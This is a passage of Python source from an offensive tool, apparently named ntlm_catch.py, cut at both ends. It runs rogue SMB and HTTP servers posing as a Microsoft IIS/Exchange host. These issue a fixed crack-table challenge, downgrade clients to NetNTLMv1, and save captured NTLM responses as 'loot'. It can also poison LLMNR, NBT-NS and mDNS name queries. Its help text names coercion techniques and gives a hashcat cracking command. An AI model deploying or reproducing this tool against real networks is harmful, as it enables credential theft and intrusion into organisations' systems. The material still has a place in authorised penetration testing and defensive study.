        plain = strip_ansi(data)
        with self._lock:
            self._log_fh.write(plain)
            self._partial += data
            while "\n" in self._partial:
                line, self._partial = self._partial.split("\n", 1)
                self._add_line(line)
            now = time.time()
            if now - self._last_render >= 0.04:
                self._render()
        return len(data)

    def _add_line(self, line):
        raw_colored = _colorize_raw(line)
        self._raw.append(raw_colored)
        evt = _format_event(line)
        if evt:
            self._info.append(evt)

    def flush(self):
        with self._lock:
            try:
                self._log_fh.flush()
            except Exception:
                pass
            try:
                self._stream.flush()
            except Exception:
                pass

    @staticmethod
    def _visible(lines, width, height, offset=0):
        wrapped = []
        for line in lines:
            wrapped.extend(ansi_wrap(line, width))
        if not wrapped:
            return [], 0
        max_offset = max(0, len(wrapped) - height)
        eff_offset = min(max(0, offset), max_offset)
        if eff_offset == 0:
            return wrapped[-height:], 0
        else:
            start = max(0, len(wrapped) - height - eff_offset)
            end = len(wrapped) - eff_offset
            return wrapped[start:end], eff_offset

    def _build_top_bar(self, width):
        pcol = self._PULSE_COLORS[self._tick_count % len(self._PULSE_COLORS)]
        pulse_str = f"\033[{pcol}m●\033[0m \033[1;32mLISTENING\033[0m"
        title = "\033[1;36mNTLM-CATCH\033[0m"

        ports = []
        if self._stats.get("smb_port"):
            ports.append(f"\033[1;34mSMB:{self._stats['smb_port']}\033[0m")
        if self._stats.get("http_port"):
            ports.append(f"\033[1;35mHTTP:{self._stats['http_port']}\033[0m")
        ports_str = " ".join(ports)
        poisoner = self._stats.get("poisoner")
        poison_str = ""
        if poisoner is not None:
            mode = "A" if poisoner.analyze else "P"
            poison_str = (f"\033[1;31m{mode}:{poisoner.status()}\033[0m "
                          f"\033[90mq:{poisoner.queries}/a:{poisoner.answers}\033[0m")

        dg_on = self._stats.get("downgrade", True)
        dg_str = "\033[1;32mDG:ON\033[0m" if dg_on else "\033[1;33mDG:OFF\033[0m"

        tot = self._stats.get("captures_total", 0)
        v1 = self._stats.get("captures_v1", 0)
        v2 = self._stats.get("captures_v2", 0)
        conns = self._stats.get("connections", 0)

        start_t = self._stats.get("start_time", time.time())
        up = int(time.time() - start_t)
        h, r = divmod(up, 3600)
        m, s = divmod(r, 60)
        up_str = f"\033[1;37m{h:02d}:{m:02d}:{s:02d}\033[0m"

        sep = " \033[90m│\033[0m "
        if width >= 115:
            items = [
                title,
                pulse_str,
                ports_str,
                poison_str,
                dg_str,
                f"Captures: \033[1;32m{tot}\033[0m (\033[1;36mv1:{v1}\033[0m, \033[1;33mv2:{v2}\033[0m)",
                f"\033[90mConns:{conns}\033[0m",
                up_str,
            ]
        elif width >= 90:
            items = [
                title,
                pulse_str,
                ports_str,
                poison_str,
                f"Cap: \033[1;32m{tot}\033[0m (\033[1;36mv1:{v1}\033[0m,\033[1;33mv2:{v2}\033[0m)",
                up_str,
            ]
        else:
            items = [
                title,
                pulse_str,
                poison_str,
                f"Cap:\033[1;32m{tot}\033[0m",
                up_str,
            ]
        return ansi_fit(sep.join(item for item in items if item), width)

    def _build_footer_bar(self, width):
        outdir = self._stats.get("outdir", "loot")
        sep = " \033[90m│\033[0m "
        is_scrolled = (self._scroll_left > 0) or (self._scroll_right > 0)
        nav_hint = "\033[1;33mEnd: Live\033[0m" if is_scrolled else "\033[90m↑/↓: Scroll\033[0m"

        if width >= 115:
            items = [
                "\033[1;37mTab: Pane\033[0m",
                "\033[1;31m1:L 2:N 3:M\033[0m",
                nav_hint,
                "\033[90mPgUp/Dn\033[0m",
                f"\033[90mLoot:\033[0m \033[0;32m{outdir}/\033[0m",
                "\033[1;33m-m 5500\033[0m / \033[1;33m-m 5600\033[0m",
                "\033[1;37mq/Ctrl+C: Stop\033[0m",
            ]
        elif width >= 90:
            items = [
                "\033[1;37mTab: Pane\033[0m",
                "\033[1;31m1/2/3: Poison\033[0m",
                nav_hint,
                f"\033[90mLoot:\033[0m \033[0;32m{outdir}/\033[0m",
                "\033[1;37mq: Stop\033[0m",
            ]
        else:
            items = [
                "\033[1;37mTab: Pane\033[0m",
                nav_hint,
                "\033[1;37mq: Stop\033[0m",
            ]
        return ansi_fit(sep.join(items), width)

    def _render(self):
        with self._lock:
            if self._closed:
                return
            size = shutil.get_terminal_size((120, 30))
            width, height = size.columns, size.lines

            if width < 60 or height < 10:
                msg = ansi_fit(f" Terminal too small ({width}x{height}) — resize to >=76x14 ", width)
                self._stream.write("\033[H\033[2J" + msg)
                self._stream.flush()
                return

            left_width = max(34, int(width * 0.46))
            sep_width = 3
            right_width = width - left_width - sep_width
            body_height = max(1, height - 6)

            left, self._scroll_left = self._visible(self._info, left_width, body_height, self._scroll_left)
            right, self._scroll_right = self._visible(self._raw, right_width, body_height, self._scroll_right)

            top_bar = self._build_top_bar(width)
            div_top = "\033[90m" + ("─" * (left_width + 1)) + "┬" + ("─" * (right_width + 1)) + "\033[0m"

            left_badge = " \033[1;36;7m EVENTS & CAPTURES \033[0m" if self._active_pane == "left" else " \033[1;36mEVENTS & CAPTURES\033[0m"
            if self._scroll_left > 0:
                left_badge += f" \033[1;33m▲ -{self._scroll_left}\033[0m"

            right_badge = " \033[1;33;7m RAW LOG & WIRE DIAGNOSTICS \033[0m" if self._active_pane == "right" else " \033[1;33mRAW LOG & WIRE DIAGNOSTICS\033[0m"
            if self._scroll_right > 0:
                right_badge += f" \033[1;33m▲ -{self._scroll_right}\033[0m"

            col_hdr = ansi_fit(left_badge, left_width + 1) + \
                      "\033[90m│\033[0m" + \
                      ansi_fit(right_badge, right_width + 1)
            div_mid = "\033[90m" + ("─" * (left_width + 1)) + "┼" + ("─" * (right_width + 1)) + "\033[0m"

            rows = [top_bar, div_top, col_hdr, div_mid]
            for i in range(body_height):
                lval = left[i] if i < len(left) else ""
                rval = right[i] if i < len(right) else ""
                rows.append(ansi_fit(lval, left_width) + " \033[90m│\033[0m " + ansi_fit(rval, right_width))

            div_bot = "\033[90m" + ("─" * (left_width + 1)) + "┴" + ("─" * (right_width + 1)) + "\033[0m"
            footer_bar = self._build_footer_bar(width)
            rows.append(div_bot)
            rows.append(footer_bar)

            clear_prefix = "\033[2J" if self._needs_clear else ""
            self._needs_clear = False
            frame = clear_prefix + "\033[H" + "\n".join(r + "\033[K" for r in rows) + "\033[J"
            try:
                self._stream.write(frame)
                self._stream.flush()
            except Exception:
                pass
            self._last_render = time.time()

    def close(self):
        with self._lock:
            if self._closed:
                return
            self._closed = True
            self._stop_ticker.set()
            if hasattr(signal, "SIGWINCH") and self._old_sigwinch is not None:
                try:
                    signal.signal(signal.SIGWINCH, self._old_sigwinch)
                except Exception:
                    pass
            if self._stdin_fd is not None and self._old_termios is not None:
                try:
                    termios.tcsetattr(self._stdin_fd, termios.TCSADRAIN, self._old_termios)
                except Exception:
                    pass
            try:
                self._log_fh.flush()
            except Exception:
                pass
            try:
                self._stream.write("\033[?1000l\033[?1006l\033[?25h\033[?1049l")
                self._stream.flush()
            except Exception:
                pass


# ---- loud connection logging (shared by both servers) ----------------------

class _Loud:
    """Mixin: announce every accepted TCP connection + surface handler errors."""

    def _loud_init(self, tag, verbose, socket_timeout, stats=None):
        self._tag = tag
        self._verbose = verbose
        self._counter = itertools.count(1)
        self._clock = threading.Lock()
        self._accepted = 0
        self._socket_timeout = socket_timeout
        self._stats = stats

    def get_request(self):
        sock, addr = self.socket.accept()
        with self._clock:
            n = next(self._counter)
            self._accepted += 1
            if self._stats is not None:
                self._stats["connections"] += 1
                self._stats["last_conn"] = "%s:%d (%s)" % (addr[0], addr[1], self._tag.upper())
        sock.settimeout(self._socket_timeout)
        ts = datetime.datetime.now().strftime("%H:%M:%S")
        print(Color.d("[%s conn #%d %s] TCP from %s:%d"
                      % (self._tag, n, ts, addr[0], addr[1])))
        return sock, addr

    def handle_error(self, request, client_address):
        exc = sys.exc_info()[1]
        if isinstance(exc, ssl.SSLError):
            print(Color.y("[!] TLS error from %s: %s (plaintext to HTTPS?)"
                          % (client_address[0], exc)))
            return
        if isinstance(exc, (socket.timeout, TimeoutError)):
            print(Color.y("[!] %s timeout from %s — TCP reached the listener, "
                          "but the request did not complete"
                          % (self._tag, client_address[0])))
            return
        if isinstance(exc, (ConnectionResetError, BrokenPipeError, OSError)):
            print(Color.d("[%s conn %s] closed/reset"
                          % (self._tag, client_address[0])))
            return
        print(Color.y("[!] %s handler error from %s: %s"
                      % (self._tag, client_address[0], exc)))
        if self._verbose:
            traceback.print_exc()


# ---- raw TCP visibility for SMB -------------------------------------------

class SMBWireMonitor:
    """Show TCP attempts to the SMB port, including incomplete handshakes.

    Linux AF_PACKET sees SYN/RST packets before they reach the TCP listener.
    This requires root/CAP_NET_RAW; the SMB listener still works without it.
    """

    def __init__(self, port, interface=None):
        self.port = port
        self.interface = interface
        self.stop = threading.Event()
        self.sock = None
        self.flows = {}
        self.lock = threading.Lock()

    def start(self):
        if not hasattr(socket, "AF_PACKET"):
            print(Color.y("  [!] SMB wire monitor unavailable on this OS; "
                          "TCP accept logging remains active"))
            return False
        try:
            self.sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW,
                                      socket.htons(0x0003))
            if self.interface:
                self.sock.bind((self.interface, 0))
            self.sock.settimeout(1.0)
        except (PermissionError, OSError) as e:
            print(Color.y("  [!] SMB wire monitor unavailable (%s); run with "
                          "root/CAP_NET_RAW to see failed TCP handshakes" % e))
            return False
        threading.Thread(target=self._run, daemon=True).start()
        threading.Thread(target=self._diagnose, daemon=True).start()
        scope = " on %s" % self.interface if self.interface else ""
        print("  [+] SMB wire monitor active for TCP/%d%s "
              "(SYN/RST/FIN/data)" % (self.port, scope))
        return True

    @staticmethod
    def _parse(packet):
        if len(packet) < 14:
            return None
        eth_type = struct.unpack("!H", packet[12:14])[0]
        off = 14
        if eth_type in (0x8100, 0x88A8) and len(packet) >= 18:
            eth_type = struct.unpack("!H", packet[16:18])[0]
            off = 18
        if eth_type != 0x0800 or len(packet) < off + 20:  # IPv4
            return None
        ihl = (packet[off] & 0x0F) * 4
        if ihl < 20 or len(packet) < off + ihl + 20 or packet[off + 9] != 6:
            return None
        total = struct.unpack("!H", packet[off + 2:off + 4])[0]
        src = socket.inet_ntoa(packet[off + 12:off + 16])
        dst = socket.inet_ntoa(packet[off + 16:off + 20])
        tcp = off + ihl
        sport, dport, seq, ack = struct.unpack("!HHII", packet[tcp:tcp + 12])
        data_off = (packet[tcp + 12] >> 4) * 4
        flags = packet[tcp + 13]
        payload = max(0, total - ihl - data_off)
        return src, dst, sport, dport, seq, ack, flags, payload

    @staticmethod
    def _flag_names(flags):
        names = []
        for bit, name in ((0x02, "SYN"), (0x10, "ACK"), (0x04, "RST"),
                          (0x01, "FIN"), (0x08, "PSH")):
            if flags & bit:
                names.append(name)
        return "+".join(names) or "none"

    def _run(self):
        while not self.stop.is_set():
            try:
                parsed = self._parse(self.sock.recv(65535))
            except socket.timeout:
                continue
            except OSError:
                break
            if not parsed:
                continue
            src, dst, sport, dport, seq, ack, flags, payload = parsed
            inbound = dport == self.port
            outbound = sport == self.port
            if not (inbound or outbound):
                continue
            key = (src, sport) if inbound else (dst, dport)
            now = time.monotonic()
            with self.lock:
                if inbound and flags & 0x02 and not flags & 0x10:
                    self.flows[key] = [now, "syn", False]
                elif outbound and flags & 0x12 == 0x12 and key in self.flows:
                    self.flows[key][1] = "synack"
                elif inbound and flags & (0x04 | 0x01):
                    self.flows.pop(key, None)
                elif inbound and (flags & 0x10 or payload) and key in self.flows:
                    self.flows[key][1] = "connected"
            if not (flags & 0x07 or payload):
                continue
            direction = "-> listener" if inbound else "<- listener"
            print(Color.d("[smb wire] %s:%d -> %s:%d %s flags=%s seq=%d "
                          "ack=%d data=%d"
                          % (src, sport, dst, dport, direction,
                             self._flag_names(flags), seq, ack, payload)))

    def _diagnose(self):
        while not self.stop.wait(1.0):
            now = time.monotonic()
            with self.lock:
                pending = [(key, state) for key, state in self.flows.items()
                           if not state[2] and state[1] != "connected"
                           and now - state[0] >= 5]
                for _, state in pending:
                    state[2] = True
            for (ip, port), state in pending:
                if state[1] == "syn":
                    reason = ("SYN reached this host, but no SYN-ACK was seen; "
                              "check local firewall/listener/routing")
                else:
                    reason = ("SYN and SYN-ACK were seen, but the client did "
                              "not finish the TCP handshake; return path or "
                              "remote firewall may be blocking it")
                print(Color.y("[!] SMB TCP attempt from %s:%d failed: %s"
                              % (ip, port, reason)))

    def close(self):
        self.stop.set()
        if self.sock:
            self.sock.close()


# ---- SMB server ------------------------------------------------------------

def _recvn(sock, n):
    buf = b""
    while len(buf) < n:
        chunk = sock.recv(n - len(buf))
        if not chunk:
            return None
        buf += chunk
    return buf


def _read_smb(sock):
    """Read one NBSS-framed message (4-byte big-endian length prefix)."""
    hdr = _recvn(sock, 4)
    if not hdr:
        return None
    length = struct.unpack(">I", hdr)[0] & 0x00FFFFFF
    if length > MAX_MESSAGE_SIZE:
        raise ValueError("SMB frame too large: %d bytes" % length)
    return _recvn(sock, length)


def _frame(msg):
    return struct.pack(">I", len(msg)) + msg


class SMBHandler(socketserver.BaseRequestHandler):
    _FAILURE_HINTS = {
        "tcp": ("TCP handshake completed, but no complete SMB frame arrived; "
                "the client stopped early or SMB was blocked after connect"),
        "non-smb": ("TCP reached port 445, but the payload was not SMB; check "
                    "the coercion target/port and any redirecting proxy"),
        "smb": ("SMB traffic arrived, but no supported NEGOTIATE or "
                "SESSION_SETUP completed"),
        "negotiate": ("SMB negotiation completed, but the client did not send "
                      "an NTLM Type-1; NTLM may be disabled or Kerberos/policy "
                      "stopped fallback"),
        "session-no-ntlm": ("SMB SESSION_SETUP arrived without an NTLMSSP "
                            "token; the client may be attempting Kerberos only"),
        "ntlm-unsupported": ("an unsupported NTLMSSP message type arrived"),
        "type1": ("NTLM Type-1 arrived and the challenge was sent, but no "
                  "Type-3 returned; check client NTLM policy, return-path "
                  "filtering, or target-side cancellation"),
        "type3-invalid": ("NTLM Type-3 arrived but was malformed or unsupported"),
    }

    def _stage(self, stage):
        if self.stage == stage:
            return
        self.stage = stage
        print(Color.d("    [smb] %s attempt stage: %s"
                      % (self.client_address[0], stage)))

    def handle(self):
        srv = self.server
        ip = self.client_address[0]
        self.session_id = struct.unpack("<Q", os.urandom(8))[0]
        self.stage = "tcp"
        try:
            while True:
                msg = _read_smb(self.request)
                if not msg:
                    break
                out = self._process(msg, srv, ip)
                if out:
                    self.request.sendall(_frame(out))
        except socket.timeout:
            print(Color.y("    [smb] %s timed out — TCP connected, but the SMB "
                          "exchange did not complete" % ip))
        except ValueError as e:
            print(Color.y("    [smb] malformed request from %s: %s" % (ip, e)))
        except (ConnectionResetError, BrokenPipeError, OSError):
            print(Color.d("    [smb] %s disconnected before authentication "
                          "completed" % ip))
        finally:
            hint = self._FAILURE_HINTS.get(self.stage)
            if hint:
                print(Color.y("[!] SMB coercion attempt from %s:%d stopped at "
                              "%s: %s"
                              % (ip, self.client_address[1], self.stage, hint)))

    def _process(self, msg, srv, ip):
        v = srv._verbose
        # SMB1 multi-protocol negotiate -> switch the client up to SMB2.
        if msg[:4] == b"\xffSMB":
            self._stage("smb")
            if len(msg) > 4 and msg[4] == 0x72:
                if v:
                    print(Color.d("    [smb] %s SMB1 negotiate -> offering SMB2"
                                  % ip))
                return smb2_negotiate_resp(0, 0x02FF, spnego_neg_init())
            return None

        if msg[:4] != SMB2_MAGIC:
            self._stage("non-smb")
            print(Color.y("    [smb] %s sent non-SMB data (%d bytes) — ignoring"
                          % (ip, len(msg))))
            return None

        self._stage("smb")
        if len(msg) < 64:
            raise ValueError("truncated SMB2 header (%d bytes)" % len(msg))

        cmd = _u16(msg, 12)
        msg_id = struct.unpack("<Q", msg[24:32])[0]
        req_sess = struct.unpack("<Q", msg[40:48])[0]

        if cmd == 0x0000:  # NEGOTIATE
            self._stage("negotiate")
            print(Color.d("    [smb] %s NEGOTIATE" % ip))
            return smb2_negotiate_resp(msg_id, 0x0210, spnego_neg_init())

        if cmd == 0x0001:  # SESSION_SETUP
            idx = msg.find(NTLMSSP_SIG)
            if idx == -1:
                self._stage("session-no-ntlm")
                return smb2_session_setup_resp(
                    msg_id, self.session_id, STATUS_LOGON_FAILURE, b"")
            ntlm = msg[idx:]
            if len(ntlm) < 12:
                raise ValueError("truncated NTLMSSP message")
            mtype = _u32(ntlm, 8)
            if mtype == 1:
                self._stage("type1")
                print(Color.d("    [smb] %s SESSION_SETUP (Type-1) -> challenge "
                              "%s ess=%s"
                              % (ip, srv.sink.challenge_hex,
                                 "off" if srv.downgrade else "on")))
                t2 = build_type2(srv.challenge8, srv.domain, srv.computer,
                                 srv.downgrade)
                sb = spnego_challenge(t2)
                return smb2_session_setup_resp(
                    msg_id, self.session_id, STATUS_MORE_PROCESSING, sb)
            if mtype == 3:
                print(Color.d("    [smb] %s SESSION_SETUP (Type-3)" % ip))
                try:
                    t = parse_type3(ntlm)
                    srv.sink.handle(ip, t, "SMB")
                    self._stage("captured")
                except Exception as e:
                    self._stage("type3-invalid")
                    print(Color.y("    [!] SMB Type-3 parse failed from %s: %s"
                                  % (ip, e)))
                return smb2_session_setup_resp(
                    msg_id, req_sess or self.session_id,
                    STATUS_LOGON_FAILURE, b"")
            self._stage("ntlm-unsupported")
            return smb2_session_setup_resp(
                msg_id, self.session_id, STATUS_LOGON_FAILURE, b"")

        # Any other command (tree connect, etc.): deny so the client stops.
        return smb2_header(cmd, msg_id, req_sess, STATUS_LOGON_FAILURE) + \
            struct.pack("<HH", 9, 0)


class LoudSMBServer(_Loud, socketserver.ThreadingTCPServer):
    allow_reuse_address = True
    daemon_threads = True

    def __init__(self, addr, sink, challenge8, domain, computer,
                 downgrade, verbose, socket_timeout, stats=None):
        super().__init__(addr, SMBHandler)
        self._loud_init("smb", verbose, socket_timeout, stats)
        self.sink = sink
        self.challenge8 = challenge8
        self.domain = domain
        self.computer = computer
        self.downgrade = downgrade


# ---- HTTP server -----------------------------------------------------------

def make_http_handler(sink, challenge8, domain, computer, downgrade, verbose):

    class Handler(BaseHTTPRequestHandler):
        server_version = "Microsoft-IIS/10.0"
        sys_version = ""
        protocol_version = "HTTP/1.1"

        def log_message(self, *a):
            pass

        def log_error(self, fmt, *args):
            print(Color.y("    [http] %s — request did not complete: %s"
                          % (self.client_address[0], fmt % args)))

        def _finish_empty(self, code, extra=None):
            self.send_response(code)
            self.send_header("Server", "Microsoft-IIS/10.0")
            for k, v in (extra or []):
                self.send_header(k, v)
            self.send_header("Content-Length", "0")
            self.end_headers()

        def _handle(self):
            auth = self.headers.get("Authorization", "")
            ip = self.client_address[0]
            state = "no-auth" if not auth else auth.split(" ", 1)[0]
            print(Color.d("    [http] %s %s from %s (auth: %s)"
                          % (self.command, self.path, ip, state)))
            try:
                clen = int(self.headers.get("Content-Length", 0) or 0)
            except ValueError:
                print(Color.y("    [http] invalid Content-Length from %s" % ip))
                return self._finish_empty(400)
            if clen < 0 or clen > MAX_MESSAGE_SIZE:
                print(Color.y("    [http] rejected body of %d bytes from %s"
                              % (clen, ip)))
                return self._finish_empty(413)
            if clen:
                try:
                    self.rfile.read(clen)
                except socket.timeout:
                    self.close_connection = True
                    print(Color.y("    [http] %s timed out while sending the "
                                  "request body" % ip))
                    return
                except Exception:
                    pass

            if not auth:
                return self._finish_empty(401, [
                    ("WWW-Authenticate", "NTLM"),
                    ("WWW-Authenticate", "Negotiate"),
                ])
            up = auth.upper()
            if not up.startswith("NTLM ") and not up.startswith("NEGOTIATE "):
                return self._finish_empty(401, [("WWW-Authenticate", "NTLM")])
            try:
                token = base64.b64decode(auth.split(" ", 1)[1].strip(),
                                         validate=True)
            except (ValueError, binascii.Error):
                return self._finish_empty(400)
            if token[:8] != NTLMSSP_SIG:
                return self._finish_empty(401, [("WWW-Authenticate", "NTLM")])

            mtype = _u32(token, 8)
            if mtype == 1:
                print(Color.d("    [http] %s Type-1 -> challenge sent" % ip))
                t2 = build_type2(challenge8, domain, computer, downgrade)
                hdr = "NTLM " + base64.b64encode(t2).decode()
                return self._finish_empty(401, [("WWW-Authenticate", hdr)])
            if mtype == 3:
                try:
                    t = parse_type3(token)
                    sink.handle(ip, t, "HTTP")
                except Exception as e:
                    print(Color.y("    [!] HTTP Type-3 parse failed from %s: %s"
                                  % (ip, e)))
                body = b"OK"
                self.send_response(200)
                self.send_header("Server", "Microsoft-IIS/10.0")
                self.send_header("Content-Type", "text/plain")
                self.send_header("Content-Length", str(len(body)))
                self.end_headers()
                if self.command != "HEAD":
                    self.wfile.write(body)
                return
            return self._finish_empty(401, [("WWW-Authenticate", "NTLM")])

        do_GET = _handle
        do_POST = _handle
        do_HEAD = _handle
        do_OPTIONS = _handle
        do_PUT = _handle
        do_PROPFIND = _handle

    return Handler


class LoudHTTPServer(_Loud, ThreadingHTTPServer):
    allow_reuse_address = True
    daemon_threads = True

    def __init__(self, addr, handler, verbose, socket_timeout, stats=None):
        super().__init__(addr, handler)
        self._loud_init("http", verbose, socket_timeout, stats)


def ensure_selfsigned(certdir):
    cert = os.path.join(certdir, "cert.pem")
    key = os.path.join(certdir, "key.pem")
    if os.path.exists(cert) and os.path.exists(key):
        return cert, key
    os.makedirs(certdir, exist_ok=True)
    import subprocess
    subprocess.check_call([
        "openssl", "req", "-x509", "-newkey", "rsa:2048", "-nodes",
        "-keyout", key, "-out", cert, "-days", "365",
        "-subj", "/CN=mail.corp.local",
    ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    return cert, key


# ---- main ------------------------------------------------------------------

def main():
    p = argparse.ArgumentParser(
        prog="ntlm_catch.py",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        description=__doc__,
        epilog="""examples:
  # SMB(445) + HTTP(80), fixed challenge, downgrade to v1 (defaults)
  sudo python3 ntlm_catch.py

  # SMB only (classic coercion: PetitPotam / PrinterBug / DFSCoerce)
  sudo python3 ntlm_catch.py --mode smb

  # HTTP only, on a high port, no root
  python3 ntlm_catch.py --mode http --http-port 8080

  # capture v2 as-is (no downgrade), custom challenge
  sudo python3 ntlm_catch.py --no-downgrade --challenge 0011223344556677

  # crack captured NetNTLMv1 (fixed challenge -> crack.sh or hashcat):
  hashcat -m 5500 loot/netntlmv1.txt wordlist.txt
""")
    p.add_argument("--mode", choices=["both", "smb", "http"], default="both",
                   help="which listeners to start (default both)")
    p.add_argument("-i", "--bind", default="0.0.0.0",
                   help="interface to bind (default 0.0.0.0)")
    p.add_argument("--smb-port", type=int, default=445, help="SMB port (445)")
    p.add_argument("--http-port", type=int, default=80, help="HTTP port (80)")
    p.add_argument("--challenge", default="1122334455667788",
                   help="8-byte server challenge, 16 hex chars "
                        "(default 1122334455667788 — crack.sh table)")
    dg = p.add_mutually_exclusive_group()
    dg.add_argument("--downgrade", dest="downgrade", action="store_true",
                    default=True, help="clear ESS to request NetNTLMv1 where "
                                       "client policy allows it (default)")
    dg.add_argument("--no-downgrade", dest="downgrade", action="store_false",
                    help="leave ESS on; capture whatever the client sends")
    p.add_argument("--domain", default="CORP",
                   help="domain advertised in the challenge")
    p.add_argument("--computer", default="EXCH01",
                   help="computer name advertised in the challenge")
    p.add_argument("-o", "--outdir", default="loot",
                   help="dir for captured hashes + log (default ./loot)")
    p.add_argument("--tls", action="store_true",
                   help="serve HTTPS instead of HTTP (self-signed by default)")
    p.add_argument("--cert", help="TLS cert PEM")
    p.add_argument("--key", help="TLS key PEM")
    p.add_argument("-v", "--verbose", action="store_true",
                   help="log the per-message SMB/HTTP handshake steps")
    p.add_argument("--socket-timeout", type=float, default=15.0,
                   help="seconds before an incomplete client is reported and "
                        "closed (default 15)")
    p.add_argument("--no-wire-monitor", action="store_true",
                   help="disable raw TCP diagnostics for the SMB port")
    p.add_argument("--wire-interface",
                   help="capture SMB TCP diagnostics only on this interface "
                        "(for example eth0)")
    p.add_argument("--no-color", action="store_true", help="disable ANSI color")
    p.add_argument("--no-split-view", action="store_true",
                   help="disable the interactive events/raw-log split view")
    poison_mode = p.add_mutually_exclusive_group()
    poison_mode.add_argument("--poison", action="store_true",
                             help="actively answer scoped LLMNR/NBT-NS/mDNS queries")
    poison_mode.add_argument("--poison-analyze", action="store_true",
                             help="observe scoped name queries without answering")
    p.add_argument("--poison-ip",
                   help="IPv4 address advertised by the poisoner and used to join multicast groups")
    p.add_argument("--poison-cidr",
                   help="required source scope, for example 192.168.56.0/24")
    p.add_argument("--poison-protocols", default="llmnr,nbns,mdns",
                   help="comma-separated subset of llmnr,nbns,mdns")
    p.add_argument("--poison-allow", action="append", default=[],
                   help="only answer this hostname or DNS suffix (repeatable)")
    args = p.parse_args()
    if args.socket_timeout <= 0:
        p.error("--socket-timeout must be > 0")
    if bool(args.cert) != bool(args.key):
        p.error("--cert and --key must be provided together")
    poisoning = args.poison or args.poison_analyze
    if poisoning and (not args.poison_ip or not args.poison_cidr):
        p.error("--poison/--poison-analyze require --poison-ip and --poison-cidr")
    poison_protocols = {
        item.strip().lower() for item in args.poison_protocols.split(",")
        if item.strip()
    }
    unknown_protocols = poison_protocols - {"llmnr", "nbns", "mdns"}
    if unknown_protocols:
        p.error("unknown poison protocol(s): %s" %
                ", ".join(sorted(unknown_protocols)))
    if poisoning and not poison_protocols:
        p.error("--poison-protocols must enable at least one protocol")

    try:
        sys.stdout.reconfigure(line_buffering=True)
    except Exception:
        pass
    if args.no_color:
        Color.on = False

    ch = args.challenge.replace(" ", "")
    try:
        challenge8 = binascii.unhexlify(ch)
    except binascii.Error:
        p.error("--challenge must be hex")
    if len(challenge8) != 8:
        p.error("--challenge must be exactly 8 bytes (16 hex chars)")

    stats = {
        "start_time": time.time(),
        "captures_total": 0,
        "captures_v1": 0,
        "captures_v2": 0,
        "connections": 0,
        "domain": args.domain,
        "computer": args.computer,
        "challenge": hexu(challenge8),
        "downgrade": args.downgrade,
        "outdir": args.outdir,
        "mode": args.mode,
        "smb_port": args.smb_port if args.mode in ("both", "smb") else None,
        "http_port": args.http_port if args.mode in ("both", "http") else None,
    }

    sink = Sink(args.outdir, hexu(challenge8).lower(), stats=stats)

    # Persist the entire console trace (connections, handshake steps, captures,
    # errors) to loot/session.log — no need to remember to `tee`.
    session_log = os.path.join(args.outdir, "session.log")
    split_view = None
    original_stdout = sys.stdout
    session_fh = None
    try:
        session_fh = _open_private(session_log, buffering=1)
        session_fh.write("\n===== ntlm_catch session %s =====\n"
                         % datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"))
        if not args.no_split_view and _SplitView.available(original_stdout):
            split_view = _SplitView(original_stdout, session_fh, stats=stats)
            sys.stdout = split_view
            atexit.register(split_view.close)
        else:
            sys.stdout = _Tee(original_stdout, session_fh)
    except Exception as exc:
        try:
            original_stdout.write("[!] session.log unavailable: %s\n" % exc)
            original_stdout.flush()
        except Exception:
            pass

    servers = []
    threads = []
    wire_monitor = None
    poisoner = None

    def start(server, label):
        th = threading.Thread(target=server.serve_forever, daemon=True)
        th.start()
        servers.append(server)
        threads.append(th)
        print("  [+] %s" % label)

    print(Color.b("ntlm_catch — NetNTLM capture listener"))
    print("  challenge   : %s  (fixed)" % hexu(challenge8))
    print("  downgrade   : %s" % ("ON — coaxing NetNTLMv1 (ESS cleared)"
                                  if args.downgrade else "off (ESS kept)"))
    print("  advertising : %s\\%s" % (args.domain, args.computer))
    print("  loot dir    : %s/  (one file per capture + aggregate hash files, "
          "capture.log, session.log)" % args.outdir)

    if args.mode in ("both", "smb"):
        try:
            smb = LoudSMBServer((args.bind, args.smb_port), sink, challenge8,
                                args.domain, args.computer, args.downgrade,
                                args.verbose, args.socket_timeout, stats=stats)
            if not args.no_wire_monitor:
                wire_monitor = SMBWireMonitor(args.smb_port,
                                              args.wire_interface)
                wire_monitor.start()
            start(smb, "SMB   listening on %s:%d" % (args.bind, args.smb_port))
        except PermissionError:
            print(Color.y("  [!] SMB %d needs root (try sudo, or --smb-port)"
                          % args.smb_port))
        except OSError as e:
            print(Color.y("  [!] SMB bind failed on %d: %s"
                          % (args.smb_port, e)))

    if args.mode in ("both", "http"):
        http = None
        try:
            handler = make_http_handler(sink, challenge8, args.domain,
                                        args.computer, args.downgrade,
                                        args.verbose)
            http = LoudHTTPServer((args.bind, args.http_port), handler,
                                  args.verbose, args.socket_timeout, stats=stats)
            use_tls = args.tls or args.cert
            if use_tls:
                if args.cert and args.key:
                    cert, key = args.cert, args.key
                else:
                    cert, key = ensure_selfsigned(
                        os.path.join(args.outdir, "certs"))
                ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
                ctx.load_cert_chain(cert, key)
                http.socket = ctx.wrap_socket(
                    http.socket, server_side=True, do_handshake_on_connect=False)
            scheme = "https" if use_tls else "http"
            start(http, "HTTP  listening on %s://%s:%d"
                  % (scheme, args.bind, args.http_port))
        except PermissionError:
            print(Color.y("  [!] HTTP %d needs root (try sudo, or --http-port)"
                          % args.http_port))
        except OSError as e:
            if http is not None:
                http.server_close()
            print(Color.y("  [!] HTTP bind failed on %d: %s"
                          % (args.http_port, e)))
        except Exception as e:
            if http is not None:
                http.server_close()
            print(Color.y("  [!] HTTP startup failed: %s" % e))

    if servers and poisoning:
        try:
            poisoner = NamePoisoner(
                args.poison_ip, args.poison_cidr, poison_protocols,
                analyze=args.poison_analyze, allow_names=args.poison_allow)
            stats["poisoner"] = poisoner
            if not poisoner.start():
                poisoner = None
                stats.pop("poisoner", None)
        except (ValueError, OSError) as e:
            print(Color.y("  [!] name poisoner startup failed: %s" % e))

    if not servers:
        if split_view:
            split_view.close()
            sys.stdout = (_Tee(original_stdout, session_fh)
                          if session_fh else original_stdout)
        print(Color.y("[!] no listeners started — nothing to do."))
        sys.stdout.flush()
        sys.stdout = original_stdout
        if session_fh:
            session_fh.close()
        return

    if poisoner:
        print(Color.y("  poisoning scope: %s; TUI 1=LLMNR 2=NBT-NS 3=mDNS"
